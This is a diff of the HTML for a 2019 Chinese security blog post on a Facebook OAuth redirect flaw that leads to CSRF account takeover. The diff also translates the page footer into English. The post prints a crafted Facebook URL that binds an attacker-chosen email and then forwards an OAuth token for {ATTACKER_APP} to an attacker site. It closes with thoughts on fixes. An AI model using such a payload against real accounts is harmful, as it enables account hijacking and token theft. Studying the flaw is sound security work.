@@ -117,9 +117,9 @@
 <h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p>
 <h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p>
 <p>第二步，即location的Url如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/comet/dialog_DONOTUSE/?</span><br><span class="line">url=/add_contactpoint/dialog/submit/%3fcontactpoint=&#123;EMAIL_CHOSEN&#125;%26next=</span><br><span class="line">/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d&#123;ATTACKER_APP&#125;%2526redirect_uri%253d&#123;DOUBLE_URL_ENCODED_LINK]</span><br></pre></td></tr></table></figure>
-
-<p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
+<pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?
+url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
+/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
 <h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p>
 <p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p>
 <p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>
@@ -129,16 +129,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -151,7 +151,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
